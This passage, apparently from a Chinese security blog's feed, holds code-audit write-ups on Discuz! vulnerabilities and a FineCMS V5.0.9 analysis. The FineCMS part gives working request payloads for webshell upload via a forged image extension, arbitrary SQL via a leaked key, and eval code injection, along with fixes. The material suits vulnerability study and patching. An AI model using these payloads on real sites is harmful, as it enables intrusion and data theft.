        $checkarray = $setting[&#39;config&#39;][&#39;ucenter&#39;] ? array(&#39;source&#39;, &#39;target&#39;, &#39;ucenter&#39;) : array(&#39;source&#39;, &#39;target&#39;);
        foreach ($checkarray as $key) &#123;
      ......
    &#125;
    save_config_file($configfile, $newconfig, $config_default);</code></pre>
<p><code>$newconfig</code>从<code>$_POST[newconfig]</code>获取数据，<code>save_config_file</code>函数保将<code>$newconfig</code>保存到<code>$configfile</code>文件中，即<code>config.inc.php</code>文件。跟进该函数。</p>
<pre><code class="php">function save_config_file($filename, $config, $default) &#123;
    $config = setdefault($config, $default);// 将$config中的空白项用 $default 中对应项的值填充
    $date = gmdate(&quot;Y-m-d H:i:s&quot;, time() + 3600 * 8);
    $year = date(&#39;Y&#39;);
    $content = &lt;&lt;&lt;EOT
&lt;?php


\$_config = array();

EOT;
    $content .= getvars(array(&#39;_config&#39; =&gt; $config));
    $content .= &quot;\r\n// &quot;.str_pad(&#39;  THE END  &#39;, 50, &#39;-&#39;, STR_PAD_BOTH).&quot; //\r\n\r\n?&gt;&quot;;
    file_put_contents($filename, $content);
&#125;</code></pre>
<p>getvars函数处理，此时的<code>$config</code> = <code>$newconfig+config.default.php对应项的补充</code>。看一下getvars函数：</p>
<pre><code class="php">function getvars($data, $type = &#39;VAR&#39;) &#123;
    $evaluate = &#39;&#39;;
    foreach($data as $key =&gt; $val) &#123;
        if(!preg_match(&quot;/^[a-zA-Z_\x7f-\xff][a-zA-Z0-9_\x7f-\xff]*$/&quot;, $key)) &#123;
            continue;
        &#125;
        if(is_array($val)) &#123;
            $evaluate .= buildarray($val, 0, &quot;\$&#123;$key&#125;&quot;).&quot;\r\n&quot;;
        &#125; else &#123;
            $val = addcslashes($val, &#39;\&#39;\\&#39;);
            $evaluate .= $type == &#39;VAR&#39; ? &quot;\$$key = &#39;$val&#39;;\n&quot; : &quot;define(&#39;&quot;.strtoupper($key).&quot;&#39;, &#39;$val&#39;);\n&quot;;
        &#125;
    &#125;
    return $evaluate;
&#125;</code></pre>
<p>满足if条件会执行<code>buildarray</code>函数，此时<code>$key=_config</code>，<code>$val</code>=上面的<code>$config</code>。最终造成写入的在该函数中（update.php 2206行）：</p>
<pre><code class="php">    foreach ($array as $key =&gt; $val) &#123;
        if($level == 0) &#123;
            //str_pad — 使用另一个字符串填充字符串为指定长度
            // 第一个参数是要输出的字符串，指定长度为50，用&#39;-&#39;填充，居中
            $newline = str_pad(&#39;  CONFIG &#39;.strtoupper($key).&#39;  &#39;, 50, &#39;-&#39;, STR_PAD_BOTH);
            $return .= &quot;\r\n// $newline //\r\n&quot;;
        &#125;</code></pre>
<p>本意是使用<code>$config</code>数组的key作为每一块配置区域的”注释标题”，写入配置文件的$newline依赖于$key，而$key是攻击者可控的。</p>
<p>未对输入数据进行正确的边界处理，导致可以插入换行符，逃离注释的作用范围，从而使输入数据转化为可执行代码。</p>
<h3 id="5、修复建议"><a href="#5、修复建议" class="headerlink" title="5、修复建议"></a>5、修复建议</h3><p>update.php 2206行</p>
<pre><code class="php">  foreach ($array as $key =&gt; $val)&#123; 
    //过滤掉$key中的非字母、数字及下划线字符</code></pre>
<h2 id="全版本后台Sql注入"><a href="#全版本后台Sql注入" class="headerlink" title="全版本后台Sql注入"></a>全版本后台Sql注入</h2><h3 id="1、简述-4"><a href="#1、简述-4" class="headerlink" title="1、简述"></a>1、简述</h3><p>Discuz! X系列全版本 截止到 Discuz! X3.4 R20191201 UTF-8</p>
<p><strong>二次注入</strong></p>
<p>利用条件有限，还是挺鸡肋的。</p>
<h3 id="2、复现环境-4"><a href="#2、复现环境-4" class="headerlink" title="2、复现环境"></a>2、复现环境</h3><p>同上</p>
<h3 id="3、漏洞复现-4"><a href="#3、漏洞复现-4" class="headerlink" title="3、漏洞复现"></a>3、漏洞复现</h3><p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/dz_3.4_%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4/background_sqli/5_3.png"></p>
<p>报错注入：</p>
<p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/dz_3.4_%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4/background_sqli/5_1.png"></p>
<p>写文件：</p>
<p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/dz_3.4_%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4/background_sqli/5_2.png"></p>
<h3 id="4、漏洞分析-4"><a href="#4、漏洞分析-4" class="headerlink" title="4、漏洞分析"></a>4、漏洞分析</h3><p>漏洞原因：经过addslashes存入文件中,从文件中取出字符,转义符号丢失，造成二次注入</p>
<p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/dz_3.4_%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4/background_sqli/5_4.png"></p>
<p>由前几个的分析已经明白了dz的路由形式，此处的路由解析如下：<code>?action=xxx =&gt; ../admincp_xxx.php</code></p>
<p>跟进<code>source/admincp/admincp_setting.php</code>，2566行，接收参数修改<code>UC_APPID</code>值。</p>
<pre><code class="php">        $configfile = str_replace(&quot;define(&#39;UC_APPID&#39;, &#39;&quot;.addslashes(UC_APPID).&quot;&#39;)&quot;, &quot;define(&#39;UC_APPID&#39;, &#39;&quot;.$settingnew[&#39;uc&#39;][&#39;appid&#39;].&quot;&#39;)&quot;, $configfile);

        $fp = fopen(&#39;./config/config_ucenter.php&#39;, &#39;w&#39;);
        if(!($fp = @fopen(&#39;./config/config_ucenter.php&#39;, &#39;w&#39;))) &#123;
            cpmsg(&#39;uc_config_write_error&#39;, &#39;&#39;, &#39;error&#39;);
        &#125;
        @fwrite($fp, trim($configfile));
        @fclose($fp);</code></pre>
<p>成功写入恶意<code>UC_APPID</code>后，执行更新读取新的配置信息，3415行：</p>
<pre><code class="php">    if($updatecache) &#123;

        updatecache(&#39;setting&#39;);</code></pre>
<p>最后在<code>uc_client/model/base.php</code>的<code>note_exists</code>方法中触发注入</p>
<pre><code class="php">    function note_exists() &#123;
        $noteexists = $this-&gt;db-&gt;result_first(&quot;SELECT value FROM &quot;.UC_DBTABLEPRE.&quot;vars WHERE name=&#39;noteexists&quot;.UC_APPID.&quot;&#39;&quot;);
        if(empty($noteexists)) &#123;
            return FALSE;
        &#125; else &#123;
            return TRUE;
        &#125;
    &#125;</code></pre>
<h2 id="Discuz-ML-V3-X-代码注入漏洞"><a href="#Discuz-ML-V3-X-代码注入漏洞" class="headerlink" title="Discuz ML! V3.X 代码注入漏洞"></a>Discuz ML! V3.X 代码注入漏洞</h2><h3 id="1、简述-5"><a href="#1、简述-5" class="headerlink" title="1、简述"></a>1、简述</h3><p><strong>漏洞编号：</strong>CVE-2019-13956</p>
<p><strong>成因：</strong>漏洞是由于Discuz! ML对于cookie字段的不恰当处理造成的，cookie字段中的language参数未经过滤，直接被拼接写入缓存文件之中，而缓存文件随后又被加载，从而造成代码执行</p>
<h3 id="2、复现环境-5"><a href="#2、复现环境-5" class="headerlink" title="2、复现环境"></a>2、复现环境</h3>]]></content>
      <categories>
        <category>代码审计</category>
      </categories>
      <tags>
        <tag>代码审计</tag>
        <tag>漏洞复现</tag>
      </tags>
  </entry>
  <entry>
    <title>Finecms V5.0.9任意文件上传&amp;任意代码执行&amp;任意SQL语句执行</title>
    <url>/2018/01/24/finecms-v5.0.9-ren-yi-wen-jian-shang-chuan-ren-yi-dai-ma-zhi-xing-ren-yi-sql-yu-ju-zhi-xing/</url>
    <content><![CDATA[<h1 id="0X01-任意文件上传"><a href="#0X01-任意文件上传" class="headerlink" title="0X01 任意文件上传"></a>0X01 任意文件上传</h1><p>​    漏洞存在于会员的修改上传头像页面(xxxxx/index.php?s=member&amp;c=account&amp;m=avatar)</p>
<h2 id="漏洞实现"><a href="#漏洞实现" class="headerlink" title="漏洞实现"></a>漏洞实现</h2><p>对上传的头像进行burp抓包。</p>
<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20180123/202341938.png" alt="mark"></p>
<p>​    这里将tx参数内容里的jpeg改为php，上传文件，实际上成功上传了个php文件。</p>
<p>​    路径可以通过审查元素找到头像图片的路径和格式。</p>
<p>​    <img src="http://omfp4wyym.bkt.clouddn.com/blog/20180123/202714351.png" alt="mark"></p>
<p>​    文件成功上传，且上传的一句话可正常执行命令。</p>
<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20180123/202810399.png" alt="mark"></p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>问题出在<code>finecms/dayrui/controllers/member/Account.php</code>的第177行开始的upload函数。</p>
<pre><code class="php">   public function upload() &#123;

        // 创建图片存储文件夹
        $dir = SYS_UPLOAD_PATH.&#39;/member/&#39;.$this-&gt;uid.&#39;/&#39;;
        @dr_dir_delete($dir);
        !is_dir($dir) &amp;&amp; dr_mkdirs($dir);

        if ($_POST[&#39;tx&#39;]) &#123;
            $file = str_replace(&#39; &#39;, &#39;+&#39;, $_POST[&#39;tx&#39;]);
            if (preg_match(&#39;/^(data:\s*image\/(\w+);base64,)/&#39;, $file, $result))&#123;
                $new_file = $dir.&#39;0x0.&#39;.$result[2];
                if (!@file_put_contents($new_file, base64_decode(str_replace($result[1], &#39;&#39;, $file)))) &#123;
                    exit(dr_json(0, &#39;目录权限不足或磁盘已满&#39;));
                &#125; else &#123;
                    $this-&gt;load-&gt;library(&#39;image_lib&#39;);
                    $config[&#39;create_thumb&#39;] = TRUE;
                    $config[&#39;thumb_marker&#39;] = &#39;&#39;;
                    $config[&#39;maintain_ratio&#39;] = FALSE;
                    $config[&#39;source_image&#39;] = $new_file;
                    foreach (array(30, 45, 90, 180) as $a) &#123;
                        $config[&#39;width&#39;] = $config[&#39;height&#39;] = $a;
                        $config[&#39;new_image&#39;] = $dir.$a.&#39;x&#39;.$a.&#39;.&#39;.$result[2];
                        $this-&gt;image_lib-&gt;initialize($config);
                        if (!$this-&gt;image_lib-&gt;resize()) &#123;
                            exit(dr_json(0, &#39;上传错误：&#39;.$this-&gt;image_lib-&gt;display_errors()));
                            break;
                        &#125;
                    &#125;
                    list($width, $height, $type, $attr) = getimagesize($dir.&#39;45x45.&#39;.$result[2]);
                    !$type &amp;&amp; exit(dr_json(0, &#39;图片字符串不规范&#39;));
                &#125;
            &#125; else &#123;

                exit(dr_json(0, &#39;图片字符串不规范&#39;));
            &#125;
        &#125; else &#123;
            exit(dr_json(0, &#39;图片不存在&#39;));
        &#125;

// 上传图片到服务器
        if (defined(&#39;UCSSO_API&#39;)) &#123;
            $rt = ucsso_avatar($this-&gt;uid, file_get_contents($dir.&#39;90x90.jpg&#39;));
            !$rt[&#39;code&#39;] &amp;&amp; $this-&gt;_json(0, fc_lang(&#39;通信失败：%s&#39;, $rt[&#39;msg&#39;]));
        &#125;


        exit(&#39;1&#39;);
    &#125;

&#125;</code></pre>
<p><code>    $dir = SYS_UPLOAD_PATH.&#39;/member/&#39;.$this-&gt;uid.&#39;/&#39;;</code>上传文件的路径，在member后拼接了$uid使每一个用户上传文件独立一个文件夹，uid在cookie中，上文burp抓到的包中可以看到。</p>
<p>​    这里对传进来的tx参数有个正则匹配来获取文件扩展名和文件内容。</p>
<p>​    问题就出在第186行这个正则上:<code>/^(data:\s*image\/(\w+);base64,)/</code>。</p>
<p>​    它会匹配data:开头，中间带有image/，base64,结尾的一段字符串。关键在<code>(\w+)</code>这个正则，它会匹配image/后base64前的内容，作为newfile的文件后缀名。<code>$new_file = $dir.&#39;0x0.&#39;.$result[2];</code>,这里没有进行任何过滤导致了可以上传任何类型的文件。</p>
<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20180123/233714211.png" alt="mark"></p>
<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20180123/233724241.png" alt="mark"></p>
<h2 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h2><p>对匹配到的文件扩展名进行过滤。只允许特定图片类型。</p>
<h1 id="0X02-任意SQL语句执行"><a href="#0X02-任意SQL语句执行" class="headerlink" title="0X02 任意SQL语句执行"></a>0X02 任意SQL语句执行</h1><h2 id="漏洞实现-1"><a href="#漏洞实现-1" class="headerlink" title="漏洞实现"></a>漏洞实现</h2><p>​    payload：</p>
<pre><code>/index.php?c=api&amp;m=data2&amp;auth=50ce0d2401ce4802751739552c8e4467&amp;param=action=sql sql=&#39;select user();&#39;</code></pre>
<p>​    auth的值为此cookiename部分值的md5值。</p>
<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20170827/183650354.png" alt="mark"></p>
<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20170827/212038658.png" alt="mark"></p>
<h2 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>​    <code>/finecms/dayrui/config/config.php</code>中的第37行对cookie_name进行了定义。</p>
<pre><code>$config[&#39;sess_cookie_name&#39;]                = $site[&#39;SYS_KEY&#39;].&#39;_ci_session&#39;;</code></pre>
<p>​    这里$site[‘SYS_KEY’]不就把SYS_KEY的值给暴露了。</p>
<p>​    这个SYS_KEY是安全码，有了它就能进行接下来的敏感函数的调用。</p>
<p>​    <code>/finecms/dayrui/controllers/Api.php</code>中的115-166行的data2()函数。</p>
<pre><code class="php">public function data2() &#123;

        $data = array();

        // 安全码认证
        $auth = $this-&gt;input-&gt;get(&#39;auth&#39;, true);
        if ($auth != md5(SYS_KEY)) &#123;
            // 授权认证码不正确
            $data = array(&#39;msg&#39; =&gt; &#39;授权认证码不正确&#39;, &#39;code&#39; =&gt; 0);
        &#125; else &#123;
            // 解析数据
            $cache = &#39;&#39;;
            $param = $this-&gt;input-&gt;get(&#39;param&#39;);
            if (isset($param[&#39;cache&#39;]) &amp;&amp; $param[&#39;cache&#39;]) &#123;
                $cache = md5(dr_array2string($param));
                $data = $this-&gt;get_cache_data($cache);
            &#125;
            if (!$data) &#123;

                // list数据查询
                $data = $this-&gt;template-&gt;list_tag($param);
                $data[&#39;code&#39;] = $data[&#39;error&#39;] ? 0 : 1;
                unset($data[&#39;sql&#39;], $data[&#39;pages&#39;]);

                // 缓存数据
                $cache &amp;&amp; $this-&gt;set_cache_data($cache, $data, $param[&#39;cache&#39;]);
            &#125;
        &#125;

        // 接收参数
        $format = $this-&gt;input-&gt;get(&#39;format&#39;);
        $function = $this-&gt;input-&gt;get(&#39;function&#39;);
        if ($function) &#123;
            if (!function_exists($function)) &#123;
                $data = array(&#39;msg&#39; =&gt; fc_lang(&#39;自定义函数&#39;.$function.&#39;不存在&#39;), &#39;code&#39; =&gt; 0);
            &#125; else &#123;
                $data = $function($data);
            &#125;
        &#125;

        // 页面输出
        if ($format == &#39;php&#39;) &#123;
            print_r($data);
        &#125; elseif ($format == &#39;jsonp&#39;) &#123;
            // 自定义返回名称
            echo $this-&gt;input-&gt;get(&#39;callback&#39;, TRUE).&#39;(&#39;.$this-&gt;callback_json($data).&#39;)&#39;;
        &#125; else &#123;
            // 自定义返回名称
            echo $this-&gt;callback_json($data);
        &#125;
        exit;
    &#125;</code></pre>
<p>​    可以看到开始有个安全码的验证，有了之前得到的安全码，就可以利用这个函数了.</p>
<p>​    <code>if ($auth != md5(SYS_KEY)) &#123;</code>将auth值与SYS_KEY的md5值进行比对，同则继续，异则失败。</p>
<p>​    127行获得输入param参数值。</p>
<pre><code class="php">$param = $this-&gt;input-&gt;get(&#39;param&#39;);</code></pre>
<p>​    不满足128行的if条件，得以继续执行。</p>
<pre><code class="php"> if (isset($param[&#39;cache&#39;]) &amp;&amp; $param[&#39;cache&#39;]) &#123;</code></pre>
<p>​    135行造成了漏洞。</p>
<pre><code class="php">$data = $this-&gt;template-&gt;list_tag($param);</code></pre>
<p>​    定位list_tag()函数看看。</p>
<p>​    <code>/finecms/dayrui/libraries/Template.php</code>第402-1314是list_tag函数。</p>
<p>​    <code>/finecms/dayrui/libraries/Template.php</code>第434行<code>$params = explode(&#39; &#39;, $_params);</code>将传入的param以数组赋值给$params。</p>
<pre><code>Array()&#123;
  [0] =&gt; action=sql,
  [1] =&gt; sql=&#39;select user();&#39;
&#125;</code></pre>
<p>​    第436行开始遍历<code>$params</code>并赋值<code>$system[&#39;action&#39;]=sql</code>&amp;<code>$param[&#39;aql&#39;]=</code>‘select user();’.</p>
<pre><code class="php">437    $var = substr($t, 0, strpos($t, &#39;=&#39;));
438    $val = substr($t, strpos($t, &#39;=&#39;) + 1);

446    if (isset($system[$var])) &#123; // 系统参数，只能出现一次，不能添加修饰符
447    $system[$var] = $val;
448    &#125;

467    $param[$var] = $val;</code></pre>
<p>​    通过switch case匹配执行查询代码。</p>
<pre><code class="php">      switch ($system[&#39;action&#39;]) &#123;
            ·····················
              ·················
                  ·········
        case &#39;sql&#39;: // 直接sql查询

                if (preg_match(&#39;/sql=\&#39;(.+)\&#39;/sU&#39;, $_params, $sql)) &#123;


                    // 数据源的选择
                    $db = $this-&gt;ci-&gt;db;

                    // 替换前缀
                    $sql = str_replace(
                        array(&#39;@#S&#39;, &#39;@#&#39;),
                        array($db-&gt;dbprefix.$system[&#39;site&#39;], $db-&gt;dbprefix),
                        trim(urldecode($sql[1]))
                    );
                    if (stripos($sql, &#39;SELECT&#39;) !== 0) &#123;
                        return $this-&gt;_return($system[&#39;return&#39;], &#39;SQL语句只能是SELECT查询语句&#39;);
                    &#125;

                    $total = 0;
                    $pages = &#39;&#39;;

                    // 如存在分页条件才进行分页查询
                    if ($system[&#39;page&#39;] &amp;&amp; $system[&#39;urlrule&#39;]) &#123;
                        $page = max(1, (int)$_GET[&#39;page&#39;]);
                        $row = $this-&gt;_query(preg_replace(&#39;/select \* from/iUs&#39;, &#39;SELECT count(*) as c FROM&#39;, $sql), $system[&#39;site&#39;], $system[&#39;cache&#39;], FALSE);
                        $total = (int)$row[&#39;c&#39;];
                        $pagesize = $system[&#39;pagesize&#39;] ? $system[&#39;pagesize&#39;] : 10;
                        // 没有数据时返回空
                        if (!$total) &#123;
                            return $this-&gt;_return($system[&#39;return&#39;], &#39;没有查询到内容&#39;, $sql, 0);
                        &#125;
                        $sql.= &#39; LIMIT &#39;.$pagesize * ($page - 1).&#39;,&#39;.$pagesize;
                        $pages = $this-&gt;_get_pagination(str_replace(&#39;[page]&#39;, &#39;&#123;page&#125;&#39;, urldecode($system[&#39;urlrule&#39;])), $pagesize, $total);
                    &#125;

                    $data = $this-&gt;_query($sql, $system[&#39;site&#39;], $system[&#39;cache&#39;]);
                    $fields = NULL;

                    if ($system[&#39;module&#39;]) &#123;
                        $fields = $this-&gt;ci-&gt;module[$system[&#39;module&#39;]][&#39;field&#39;]; // 模型主表的字段
                    &#125;

                    if ($fields) &#123;
                        // 缓存查询结果
                        $name = &#39;list-action-sql-&#39;.md5($sql);
                        $cache = $this-&gt;ci-&gt;get_cache_data($name);
                        if (!$cache &amp;&amp; is_array($data)) &#123;
                            // 模型表的系统字段
                            $fields[&#39;inputtime&#39;] = array(&#39;fieldtype&#39; =&gt; &#39;Date&#39;);
                            $fields[&#39;updatetime&#39;] = array(&#39;fieldtype&#39; =&gt; &#39;Date&#39;);
                            // 格式化显示自定义字段内容
                            foreach ($data as $i =&gt; $t) &#123;
                                $data[$i] = $this-&gt;ci-&gt;field_format_value($fields, $t, 1);
                            &#125;
                            //$cache = $this-&gt;ci-&gt;set_cache_data($name, $data, $system[&#39;cache&#39;]);
                            $cache = $system[&#39;cache&#39;] ? $this-&gt;ci-&gt;set_cache_data($name, $data, $system[&#39;cache&#39;]) : $data;
                        &#125;
                        $data = $cache;
                    &#125;
                    return $this-&gt;_return($system[&#39;return&#39;], $data, $sql, $total, $pages, $pagesize);
                &#125; else &#123;
                    return $this-&gt;_return($system[&#39;return&#39;], &#39;参数不正确，SQL语句必须用单引号包起来&#39;); // 没有查询到内容
                &#125;
                break;

            case &#39;table&#39;: // 表名查询

                if (!$system[&#39;table&#39;]) &#123;
                    return $this-&gt;_return($system[&#39;return&#39;], &#39;table参数不存在&#39;);
                &#125;

                // 默认站点参数
                $system[&#39;site&#39;] = !$system[&#39;site&#39;] ? SITE_ID : $system[&#39;site&#39;];

                $tableinfo = $this-&gt;ci-&gt;get_cache(&#39;table&#39;);
                if (!$tableinfo) &#123;
                    $this-&gt;ci-&gt;load-&gt;model(&#39;system_model&#39;);
                    $tableinfo = $this-&gt;ci-&gt;system_model-&gt;cache(); // 表结构缓存
                &#125;
                if (!$tableinfo) &#123;
                    return $this-&gt;_return($system[&#39;return&#39;], &#39;表结构缓存不存在（后台菜单-更新表结构）&#39;); // 没有表结构缓存时返回空
                &#125;

                $table = $this-&gt;ci-&gt;db-&gt;dbprefix($system[&#39;table&#39;]); // 主表
                if (!isset($tableinfo[$table][&#39;field&#39;])) &#123;
                    return $this-&gt;_return($system[&#39;return&#39;], &#39;表（&#39;.$table.&#39;）结构缓存不存在（后台菜单-更新表结构）&#39;);
                &#125;

                $where = $this-&gt;_set_where_field_prefix($where, $tableinfo[$table][&#39;field&#39;], $table); // 给条件字段加上表前缀
                $system[&#39;field&#39;] = $this-&gt;_set_select_field_prefix($system[&#39;field&#39;], $tableinfo[$table][&#39;field&#39;], $table); // 给显示字段加上表前缀
                $system[&#39;order&#39;] = $this-&gt;_set_order_field_prefix($system[&#39;order&#39;], $tableinfo[$table][&#39;field&#39;], $table); // 给排序字段加上表前缀

                $total = 0;
                $sql_from = $table; // sql的from子句</code></pre>
<p>​    <code>  if (preg_match(&#39;/sql=\&#39;(.+)\&#39;/sU&#39;, $_params, $sql))</code></p>
<p>​    正则只是将sql=参数中的内容匹配出来作为sql查询内容，没有对查询进行限制。</p>
<p>​    传入766行的_query函数进行查询。</p>
<p><code>$data = $this-&gt;_query($sql, $system[&#39;site&#39;], $system[&#39;cache&#39;]);</code></p>
<p>​    _query函数位于<code>/finecms/dayrui/libraries/Template.php</code>第1318行。</p>
<pre><code class="php">public function _query($sql, $site, $cache, $all = TRUE) &#123;

        // 数据库对象
        $db = $site ? $this-&gt;ci-&gt;site[$site] : $this-&gt;ci-&gt;db;
        $cname = md5($sql.dr_now_url());
        // 缓存存在时读取缓存文件
        if ($cache &amp;&amp; $data = $this-&gt;ci-&gt;get_cache_data($cname)) &#123;
            return $data;
        &#125;

        // 执行SQL
        $db-&gt;db_debug = FALSE;
        $query = $db-&gt;query($sql);

        if (!$query) &#123;
            return &#39;SQL查询解析不正确：&#39;.$sql;
        &#125;

        // 查询结果
        $data = $all ? $query-&gt;result_array() : $query-&gt;row_array();

        // 开启缓存时，重新存储缓存数据
        $cache &amp;&amp; $this-&gt;ci-&gt;set_cache_data($cname, $data, $cache);

        $db-&gt;db_debug = TRUE;

        return $data;
    &#125;</code></pre>
<p>​    <code>$query = $db-&gt;query($sql);</code>执行sql语句。</p>
<p>​    就可以执行任意sql语句了(select)。</p>
<h1 id="0X03-任意代码执行"><a href="#0X03-任意代码执行" class="headerlink" title="0X03 任意代码执行"></a>0X03 任意代码执行</h1><p>###漏洞实现</p>
<p>​    payload:</p>
<pre><code class="html">/index.php?c=api&amp;m=data2&amp;auth=50ce0d2401ce4802751739552c8e4467&amp;param=action=cache%20name=MEMBER.1&#39;];phpinfo();$a=[&#39;1</code></pre>
<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20180123/235415606.png" alt="mark"></p>
<p>auth的值为此cookiename部分值的md5值。</p>
<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20180123/235609912.png" alt="mark"></p>
<p><code>24b16fede9a67c9251d3e7c7161c83ac</code>    md5=&gt;    <code>50ce0d2401ce4802751739552c8e4467</code></p>
<h2 id="漏洞分析-2"><a href="#漏洞分析-2" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>​    和上面的sql语句执行类似，先通过cookie获取到SYS_KEY，执行list_tag函数。</p>
<p>​    跟进到list_tag函数。第487-518行代码：</p>
<pre><code class="php">switch ($system[&#39;action&#39;]) &#123;

            case &#39;cache&#39;: // 系统缓存数据

                if (!isset($param[&#39;name&#39;])) &#123;
                    return $this-&gt;_return($system[&#39;return&#39;], &#39;name参数不存在&#39;);
                &#125;

                $pos = strpos($param[&#39;name&#39;], &#39;.&#39;);
                if ($pos !== FALSE) &#123;
                    $_name = substr($param[&#39;name&#39;], 0, $pos);
                    $_param = substr($param[&#39;name&#39;], $pos + 1);
                &#125; else &#123;
                    $_name = $param[&#39;name&#39;];
                    $_param = NULL;
                &#125;

                $cache = $this-&gt;_cache_var($_name, !$system[&#39;site&#39;] ? SITE_ID : $system[&#39;site&#39;]);
                if (!$cache) &#123;
                    return $this-&gt;_return($system[&#39;return&#39;], &quot;缓存(&#123;$_name&#125;)不存在，请在后台更新缓存&quot;);
                &#125;

                if ($_param) &#123;
                    $data = array();
                    @eval(&#39;$data=$cache&#39;.$this-&gt;_get_var($_param).&#39;;&#39;);
                    if (!$data) &#123;
                        return $this-&gt;_return($system[&#39;return&#39;], &quot;缓存(&#123;$_name&#125;)参数不存在!!&quot;);
                    &#125;
                &#125; else &#123;
                    $data = $cache;
                &#125;

                return $this-&gt;_return($system[&#39;return&#39;], $data, &#39;&#39;);
                break;</code></pre>
<p>​    匹配到cache，执行对应代码。这里会根据<code>.</code>将name参数的内容进行分割，前部分赋给<code>$_name</code>,后部分赋给<code>$_param</code>.此时<code>$_param=1&#39;];phpinfo();$a=[&#39;1</code>.</p>
<p>​    继续执行<code>$cache = $this-&gt;_cache_var($_name, !$system[&#39;site&#39;] ? SITE_ID : $system[&#39;site&#39;]);</code></p>
<p>​    因为下面会对$cache是否为空进行判断:</p>
<pre><code class="php">if (!$cache) &#123;
                    return $this-&gt;_return($system[&#39;return&#39;], &quot;缓存(&#123;$_name&#125;)不存在，请在后台更新缓存&quot;);</code></pre>
<p>​    所以跳转到_cache_var函数判断返回值。(Template.php/1593-1620行)</p>
<pre><code class="php"> public function _cache_var($name, $site = SITE_ID) &#123;

        $data = NULL;
        $name = strtoupper($name);

        switch ($name) &#123;
            case &#39;MEMBER&#39;:
                $data = $this-&gt;ci-&gt;get_cache(&#39;member&#39;);
                break;
            case &#39;URLRULE&#39;:
                $data = $this-&gt;ci-&gt;get_cache(&#39;urlrule&#39;);
                break;
            case &#39;MODULE&#39;:
                $data = $this-&gt;ci-&gt;get_cache(&#39;module&#39;);
                break;
            case &#39;CATEGORY&#39;:
                $site = $site ? $site : SITE_ID;
                $data = $this-&gt;ci-&gt;get_cache(&#39;category-&#39;.$site);
                break;
            default:
                $data = $this-&gt;ci-&gt;get_cache($name.&#39;-&#39;.$site);
                break;
        &#125;

        return $data;
    &#125;

&#125;</code></pre>
<p>​    只要让<code>list_tag</code>函数中赋给<code>$_name</code>的值可以在<code>_cache_var</code>函数中匹配到就可以。</p>
<p>​    继续执行接下来的内容:</p>
<pre><code class="php">if ($_param) &#123;
                    $data = array();
                    @eval(&#39;$data=$cache&#39;.$this-&gt;_get_var($_param).&#39;;&#39;);
                    if (!$data) &#123;
                        return $this-&gt;_return($system[&#39;return&#39;], &quot;缓存(&#123;$_name&#125;)参数不存在!!&quot;);
                    &#125;
                &#125; else &#123;
                    $data = $cache;
                &#125;</code></pre>
<p>​    <code>$_param</code>参数会传入<code>_get_var</code>函数进行加工。</p>
<p>​    _get_var函数内容。(Template.php/1569-1590行)</p>
<pre><code class="php">    public function _get_var($param) &#123;

        $array = explode(&#39;.&#39;, $param);
        if (!$array) &#123;
            return &#39;&#39;;
        &#125;

        $string = &#39;&#39;;
        foreach ($array as $var) &#123;
            $string.= &#39;[&#39;;
            if (strpos($var, &#39;$&#39;) === 0) &#123;
                $string.= preg_replace(&#39;/\[(.+)\]/U&#39;, &#39;[\&#39;\\1\&#39;]&#39;, $var);
            &#125; elseif (preg_match(&#39;/[A-Z_]+/&#39;, $var)) &#123;
                $string.= &#39;&#39;.$var.&#39;&#39;;
            &#125; else &#123;
                $string.= &#39;\&#39;&#39;.$var.&#39;\&#39;&#39;;
            &#125;
            $string.= &#39;]&#39;;
        &#125;

        return $string;
    &#125;</code></pre>
<p>​    return的<code>$string</code>为<code>[&#39;1&#39;];phpinfo();$a=[&#39;1&#39;]</code>。</p>
<p>​    然后将返回值拼接进eval语句进行执行，看一下拼接后的语句:<code>@eval($data=$cache[&#39;1&#39;];phpinfo();$a=[&#39;1&#39;];);</code>.顺利执行语句。</p>
<p>​    实现命令执行。</p>
<h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>更改cookiename的设置</p>
<pre><code>$config[&#39;sess_cookie_name&#39;]    = md5(substr($site[&#39;SYS_KEY&#39;],0, 5)).&#39;_ci_session&#39;;</code></pre>
]]></content>
      <categories>
        <category>代码审计</category>
      </categories>
      <tags>
        <tag>代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title>Sqli笔记</title>
    <url>/2020/01/10/sqli-bi-ji/</url>
    <content><![CDATA[<blockquote>
<p>刚刷一遍sqli-labs，而且发现之前刷sqli-labs的笔记找不到了，那就这次顺便做个比较全面的整理，包括基础知识和一些高级技巧，包括mysql、oracle和sqlserver。【oracle和sqlserver更新中】</p>
</blockquote>
<h2 id="Mysql"><a href="#Mysql" class="headerlink" title="Mysql"></a>Mysql</h2><h3 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h3><h4 id="1、变量和基础信息"><a href="#1、变量和基础信息" class="headerlink" title="1、变量和基础信息"></a>1、变量和基础信息</h4><ul>
<li><p>当前数据库版本</p>
<pre><code>VERSION()
@@VERSION
@@GLOBAL.VERSION</code></pre>
</li>
<li><p>当前用户</p>
